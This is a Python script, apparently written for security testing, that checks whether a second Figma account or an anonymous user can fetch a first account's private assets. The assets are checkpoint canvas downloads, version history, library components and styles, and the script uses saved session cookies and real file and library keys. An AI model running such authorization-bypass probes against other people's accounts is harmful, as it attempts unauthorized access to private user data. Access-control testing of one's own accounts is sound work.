"""跨用户越权综合测试（第二账号 1667396392129259941 → 第一账号 1666382703778278399 私有资产）

面1: /version/{vid}/canvas?fk=   —— checkpoint 版本画布下载（登录态 200 加密 .fig）
面2: /api/versions/{key}          —— 版本历史列表（元数据泄露）
面3: /api/design_systems/v2/library/{lk}/published_components —— 组件库资产
面4: /api/design_systems/library/{key}/styles —— 样式资产
对照：旧账号(owner) 同请求 = 基线
"""
import json, sys, hashlib
import requests

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

def load_cookies(f):
    return {c["name"]: c["value"] for c in json.load(open(f, encoding="utf-8"))}

OLD = load_cookies("figma_session.json")       # 旧账号 = owner (1666382703778278399)
NEW = load_cookies("figma_session_new.json")   # 新账号 = 非协作者 (1667396392129259941)
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36"}

FK = "qzDqStIDJyGbthpKiuvfwg"                  # 旧账号私有文件
VID = "2383785736031310214"                    # 该文件最近版本 id（versions 响应）
LK_PRIVATE = "lk-c2fada89c6b5d93b952f0164c5c6e28674794f1cb5ab0bd7cb0d7790f2f223b36d76d04db981bed4d8c9b0174e4fe3fb95f6f9ae56ffbb252a295e92ce5f1d4d"

def test(label, url, cookies, raw=False):
    try:
        r = requests.get("https://www.figma.com" + url, cookies=cookies, headers=UA, timeout=20)
        body = r.content if raw else (r.text[:300] if "json" in r.headers.get("Content-Type", "") else r.content[:120])
        if raw and r.status_code == 200:
            print(f"{label}: {r.status_code} | {len(r.content)}B | sha256={hashlib.sha256(r.content).hexdigest()[:12]} | 前16B={r.content[:16].hex()}")
        else:
            print(f"{label}: {r.status_code} | {body}")
    except Exception as e:
        print(f"{label}: ERR {e}")

print("=" * 65)
print("面1: /version/{vid}/canvas?fk=  checkpoint 版本画布下载")
print("=" * 65)
test("  [旧账号/owner] ", f"/version/{VID}/canvas?fk={FK}", OLD, raw=True)
test("  [新账号/非协作]", f"/version/{VID}/canvas?fk={FK}", NEW, raw=True)
test("  [匿名]           ", f"/version/{VID}/canvas?fk={FK}", None, raw=True)

print("\n" + "=" * 65)
print("面2: /api/versions/{key}  版本历史元数据")
print("=" * 65)
test("  [旧账号/owner] ", f"/api/versions/{FK}?page_size=200", OLD)
test("  [新账号/非协作]", f"/api/versions/{FK}?page_size=200", NEW)
test("  [匿名]           ", f"/api/versions/{FK}?page_size=200", None)

print("\n" + "=" * 65)
print("面3: design_systems/v2/library/{lk}/published_components")
print("=" * 65)
test("  [旧账号/owner] ", f"/api/design_systems/v2/library/{LK_PRIVATE}/published_components", OLD)
test("  [新账号/非协作]", f"/api/design_systems/v2/library/{LK_PRIVATE}/published_components", NEW)
test("  [匿名]           ", f"/api/design_systems/v2/library/{LK_PRIVATE}/published_components", None)

print("\n" + "=" * 65)
print("面4: design_systems/library/{key}/styles")
print("=" * 65)
test("  [旧账号/owner] ", f"/api/design_systems/library/{FK}/styles", OLD)
test("  [新账号/非协作]", f"/api/design_systems/library/{FK}/styles", NEW)
test("  [匿名]           ", f"/api/design_systems/library/{FK}/styles", None)
